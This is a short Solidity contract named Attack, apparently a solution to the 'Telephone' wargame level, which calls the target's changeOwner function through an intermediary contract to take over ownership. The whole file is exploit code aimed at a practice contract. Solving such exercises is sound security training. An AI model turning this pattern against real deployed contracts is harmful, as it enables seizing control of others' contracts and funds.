pragma solidity ^0.8.0;

import './Telephone.sol';
contract Attack{
    Telephone T;
    function exploit(address _addr) public {
        T = Telephone(_addr);
    }
    function attack() public {
        T.changeOwner(msg.sender);
    }
}